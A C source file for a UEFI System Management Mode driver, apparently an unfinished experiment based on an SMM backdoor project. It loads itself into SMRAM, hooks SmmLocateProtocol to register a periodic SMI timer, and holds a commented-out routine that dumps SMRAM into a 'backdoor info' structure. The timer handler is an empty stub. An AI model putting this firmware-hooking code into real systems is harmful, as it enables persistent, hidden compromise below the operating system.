#include <FrameworkSmm.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SmmBase.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SmmCpu.h>
#include <Protocol/SmmEndOfDxe.h>


#include <Library/UefiRuntimeLib.h>
//#include <Library/SynchronizationLib.h>
#include <Protocol/SmmPeriodicTimerDispatch2.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/DevicePathLib.h>

#include <IndustryStandard/PeImage.h>

//#pragma warning(disable: 4312)
//#pragma warning(disable: 4133)
//#pragma warning(disable: 4189)
//#pragma warning(disable: 4047)
//#pragma warning(disable: 4244)
#pragma warning(disable: 4101)
#pragma warning(disable: 4189)
typedef void* PVOID;





#define TO_MILLISECONDS(_seconds_) ((_seconds_) * 1000)
#define TO_MICROSECONDS(_seconds_) (TO_MILLISECONDS(_seconds_) * 1000)
#define TO_NANOSECONDS(_seconds_) (TO_MICROSECONDS(_seconds_) * 1000)
//----------------------------------------------sound
#define EFI_SPEAKER_CONTROL_PORT       0x61
#define EFI_SPEAKER_OFF_MASK           0xFC
#define EFI_BEEP_ON_TIME_INTERVAL      0x50000
#define EFI_BEEP_OFF_TIME_INTERVAL     0x50000
//----------------------------------------------sound
EFI_SMM_PERIODIC_TIMER_REGISTER_CONTEXT m_PeriodicTimerDispatch2RegCtx = { 1000000, 640000 };
UINT64 m_PeriodicTimerCounter = 0;
EFI_HANDLE m_PeriodicTimerDispatchHandle = NULL;
EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL* m_PeriodicTimerDispatch = NULL;
//---------------------------------------------------------------------timer
PVOID g_BackdoorInfo = NULL;
EFI_SYSTEM_TABLE* gST;
EFI_BOOT_SERVICES* gBS;

EFI_SMM_SYSTEM_TABLE2* gSmst = NULL;


EFI_DEVICE_PATH_PROTOCOL* _AppendDevicePath(IN EFI_DEVICE_PATH_PROTOCOL* Src1, IN EFI_DEVICE_PATH_PROTOCOL* Src2)
{
	EFI_STATUS Status;
	UINTN Size;
	UINTN Size1;
	UINTN Size2;
	EFI_DEVICE_PATH_PROTOCOL* NewDevicePath;
	EFI_DEVICE_PATH_PROTOCOL* SecondDevicePath;
	//// Allocate space for the combined device path. It only has one end node 	of
	// length EFI_DEVICE_PATH_PROTOCOL 
	//
	Size1 = GetDevicePathSize(Src1);
	Size2 = GetDevicePathSize(Src2);
	Size = Size1 + Size2;
	if (Size1 != 0 && Size2 != 0) {
		Size -= sizeof(EFI_DEVICE_PATH_PROTOCOL);
	}
	Status = gBS->AllocatePool(EfiBootServicesData, Size, (VOID * *)& NewDevicePath);

	if (EFI_ERROR(Status)) {
		return NULL;
	}
	gBS->CopyMem(NewDevicePath, Src1, Size1);	//// Over write Src1 EndNode and do the copy 

	if (Size1 != 0) {
		SecondDevicePath = (EFI_DEVICE_PATH_PROTOCOL*)((CHAR8*)NewDevicePath + (Size1 - sizeof(EFI_DEVICE_PATH_PROTOCOL)));
	}
	else {
		SecondDevicePath = NewDevicePath;
	}
	gBS->CopyMem(SecondDevicePath, Src2, Size2);
	return NewDevicePath;
}

EFI_STATUS
TurnOnSpeaker(VOID)
{
	UINT8 Data;

	Data = __inbyte(EFI_SPEAKER_CONTROL_PORT);
	Data |= 0x03;
	__outbyte(EFI_SPEAKER_CONTROL_PORT, Data);

	return EFI_SUCCESS;
}


EFI_STATUS
TurnOffSpeaker(VOID)
{
	UINT8 Data;

	Data = __inbyte(EFI_SPEAKER_CONTROL_PORT);
	Data &= EFI_SPEAKER_OFF_MASK;
	__outbyte(EFI_SPEAKER_CONTROL_PORT, Data);

	return EFI_SUCCESS;
}



//무었을 하는가...
EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
	CONST EFI_GUID* Protocol,
	VOID* Interface,
	EFI_HANDLE Handle)
{
	/*
	if (g_BackdoorInfo)
	{
		UINTN Offset = 0, i = 0;
		PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE);

		// enumerate available SMRAM regions
		for (;;)
		{
			EFI_SMRAM_DESCRIPTOR* Info = &g_BackdoorInfo->SmramMap[i];

			if (Info->PhysicalStart == 0 || Info->PhysicalSize == 0)
			{
				// end of the list
				break;
			}

			if (Offset + Info->PhysicalSize <= MAX_SMRAM_SIZE)
			{
				// copy SMRAM region into the backdoor info structure
				gBS->CopyMem(Buff + Offset, (VOID*)Info->PhysicalStart, Info->PhysicalSize);
			}
			else
			{
				break;
			}

			Offset += Info->PhysicalSize;
			i += 1;
		}

#ifdef USE_MSR_SMM_MCA_CAP

		// read MSR_SMM_MCA_CAP and MSR_SMM_FEATURE_CONTROL registers
		g_BackdoorInfo->SmmMcaCap = __readmsr(MSR_SMM_MCA_CAP);
		g_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);

#endif

		g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
	}
	*/
	return EFI_SUCCESS;
}

EFI_STATUS RegisterProtocolNotifySmm(EFI_GUID* Guid, EFI_SMM_NOTIFY_FN Handler, PVOID* Registration)
{
	EFI_STATUS Status = gSmst->SmmRegisterProtocolNotify(Guid, Handler, Registration);//레지스트레이션 자체는 의미가 없다는 거구나.. 암...
	if (Status == EFI_SUCCESS)
	{
		//DbgMsg(__FILE__, __LINE__, "SMM protocol notify handler is at "FPTR"\r\n", Handler);
	}
	else
	{
		//DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
	}

	return Status;
}

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(EFI_HANDLE DispatchHandle, CONST VOID* Context, VOID* CommBuffer, UINTN* CommBufferSize)
{
	EFI_STATUS Status = EFI_SUCCESS;
	//TurnOnSpeaker(); //뭔가 있던지 없던지 무관계 하게 오류가 생깁니다.
	EFI_SMM_CPU_PROTOCOL* SmmCpu = NULL;

	
	if (g_BackdoorInfo == NULL)
	{
		// we need this structure for communicating with the outsude world
		goto _end;
	}

_end:
	return EFI_SUCCESS;
}

EFI_STATUS PeriodicTimerDispatch2Register(EFI_HANDLE* DispatchHandle)
{//레지스터
	EFI_STATUS Status = EFI_INVALID_PARAMETER;

	if (m_PeriodicTimerDispatch)
	{
		// register periodic timer routine
		Status = m_PeriodicTimerDispatch->Register(m_PeriodicTimerDispatch, PeriodicTimerDispatch2Handler, &m_PeriodicTimerDispatch2RegCtx, DispatchHandle);
		if (Status == EFI_SUCCESS)
		{
			//DbgMsg(
			//	__FILE__, __LINE__, "SMM timer handler is at "FPTR"\r\n",
			//	PeriodicTimerDispatch2Handler
			//);
		}
		else
		{
			//DbgMsg(__FILE__, __LINE__, "Register() fails: 0x%X\r\n", Status);
		}
	}

	return Status;
}

EFI_STATUS PeriodicTimerDispatch2Unregister(EFI_HANDLE DispatchHandle) //언레지스터
{
	EFI_STATUS Status = EFI_INVALID_PARAMETER;

	if (m_PeriodicTimerDispatch)
	{
		// register periodic timer routine
		Status = m_PeriodicTimerDispatch->UnRegister(m_PeriodicTimerDispatch, DispatchHandle);
		if (Status == EFI_SUCCESS)
		{
			//DbgMsg(__FILE__, __LINE__, "SMM timer handler unregistered\r\n");
		}
		else
		{
			//DbgMsg(__FILE__, __LINE__, "Unregister() fails: 0x%X\r\n", Status);
		}
	}

	return Status;
}

EFI_STATUS EFIAPI PeriodicTimerDispatch2ProtocolNotifyHandler( //있으면 이걸 바로 부르는 거구나.. 바로 불려오면...
	CONST EFI_GUID* Protocol,
	VOID* Interface,
	EFI_HANDLE Handle)
{
	EFI_STATUS Status = EFI_SUCCESS;
	UINT64* SmiTickInterval = NULL;

	m_PeriodicTimerDispatch = (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL*)Interface;

	//PeriodicTimerDispatch2Register(m_PeriodicTimerDispatchHandle);

#if defined(BACKDOOR_DEBUG)

	SerialPrint("Supported timer intervals:");

	do
	{
		Status = m_PeriodicTimerDispatch->GetNextShorterInterval(
			m_PeriodicTimerDispatch,
			&SmiTickInterval
		);
		if (Status == EFI_SUCCESS)
		{
			if (*SmiTickInterval < 0x80000000)
			{
				char szBuff[0x20];

				// build debug message string
				tfp_sprintf(szBuff, " %lld", *SmiTickInterval);
				SerialPrint(szBuff);
			}
		}
		else
		{
			break;
		}
	} while (SmiTickInterval);

	SerialPrint("\r\n");

#endif // BACKDOOR_DEBUG         

	return EFI_SUCCESS;
}






int memcmp(const void* s1, const void* s2, size_t n)
{
	const unsigned char* p1 = s1, * p2 = s2;
	while (n--)
		if (*p1 != *p2)
			return *p1 - *p2;
		else
			p1++, p2++;
	return 0;
}

#define AMI_USB_SMM_PROTOCOL_GUID { 0x3ef7500e, 0xcf55, 0x474f, \
                                    { 0x8e, 0x7e, 0x00, 0x9e, 0x0e, 0xac, 0xec, 0xd2 }}

EFI_LOCATE_PROTOCOL old_SmmLocateProtocol = NULL;




EFI_STATUS EFIAPI new_SmmLocateProtocol(
	EFI_GUID* Protocol,
	VOID* Registration,
	VOID** Interface)
{
	EFI_GUID TargetGuid = AMI_USB_SMM_PROTOCOL_GUID;

	/*
		Totally board-specific hack for Intel DQ77KB, SmmLocateProtocol
		with AMI_USB_SMM_PROTOCOL_GUID is calling during OS startup after
		APIC init, so, here we can register our SMI timer.
	*/
	if (Protocol && !memcmp(Protocol, &TargetGuid, sizeof(TargetGuid)))
	{
		//DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

		if (m_PeriodicTimerDispatchHandle)
		{
			// unregister previously registered timer
			PeriodicTimerDispatch2Unregister(m_PeriodicTimerDispatchHandle);
			m_PeriodicTimerDispatchHandle = NULL;
		}

		// enable periodic timer SMI again
		PeriodicTimerDispatch2Register(&m_PeriodicTimerDispatchHandle);

		// remove the hook
		gSmst->SmmLocateProtocol = old_SmmLocateProtocol;
	}

	return old_SmmLocateProtocol(Protocol, Registration, Interface);
}





VOID HmonEntrySmm(VOID)
{
	PVOID Registration = NULL;
	EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL* PeriodicTimerDispatch = NULL;

#define REGISTER_NOTIFY(_name_) RegisterProtocolNotifySmm(&gEfiSmm##_name_##ProtocolGuid,   _name_##ProtocolNotifyHandler, &Registration)

	EFI_STATUS Status = gSmst->SmmLocateProtocol(&gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, &PeriodicTimerDispatch);
	if (Status == EFI_SUCCESS)//있으면 핸들러를 바로 부르고..
	{
		// protocol is already present, call handler directly
		PeriodicTimerDispatch2ProtocolNotifyHandler(
			&gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
			PeriodicTimerDispatch, NULL
		);

		if (Status == EFI_SUCCESS)//있으면 핸들러를 바로 부르고..
		{
			// protocol is already present, call handler directly
			PeriodicTimerDispatch2ProtocolNotifyHandler(&gEfiSmmPeriodicTimerDispatch2ProtocolGuid, PeriodicTimerDispatch, NULL);
		}
		else
		{
			REGISTER_NOTIFY(PeriodicTimerDispatch2);
		}

	}

	old_SmmLocateProtocol = gSmst->SmmLocateProtocol;
	gSmst->SmmLocateProtocol = new_SmmLocateProtocol;
}

//노티파이가 왔을때 여기로 온다는게 등록이 되었으므로... 
// 등록한것과는 별개로 이미 프로토콜이 존재한다면 여기로 오면 된다는 거시에요.



EFI_STATUS
HmonEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable) {
	
	gST = SystemTable;
	gBS = gST->BootServices;
	EFI_HANDLE Handle = NULL;
	EFI_STATUS Status = EFI_SUCCESS;
	BOOLEAN bInSmram = TRUE;

	UINT8 Data; //beep sound

	
	
	EFI_SMM_BASE_PROTOCOL* SmmBase = NULL;//base1
	Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, &SmmBase); //base1


	SmmBase->InSmm(SmmBase, &bInSmram);

	EFI_LOADED_IMAGE_PROTOCOL* LoadedImage;
	EFI_DEVICE_PATH_PROTOCOL* ImageDevicePath;
	EFI_DEVICE_PATH_PROTOCOL* CompleteFilePath;




	if (bInSmram) {
		EFI_SMM_BASE2_PROTOCOL* SmmBase2 = NULL;
		Status = gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, &SmmBase2);
		PVOID Registration = NULL;
		Status = SmmBase2->GetSmstLocation(SmmBase2, &gSmst);

		if (Status == EFI_SUCCESS){
	    
		//이게 도테제 워냐??
			HmonEntrySmm();
			//TurnOnSpeaker();
		}

	}
	else {

		if (ImageHandle != NULL) {
			//gBS->Stall(TO_MICROSECONDS(2));
			//TurnOnSpeaker();

			Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID*)& LoadedImage);
			Status = gBS->HandleProtocol(LoadedImage->DeviceHandle, &gEfiDevicePathProtocolGuid, (VOID*)& ImageDevicePath);
			CompleteFilePath = _AppendDevicePath(ImageDevicePath, LoadedImage->FilePath);
			Status = SmmBase->Register(SmmBase, CompleteFilePath, NULL, 0, &Handle, FALSE);
			//어짜피 디버그가 불가능 합니다.
		}


		return EFI_SUCCESS;
	}
	
	//w518519352
	return EFI_SUCCESS;
}

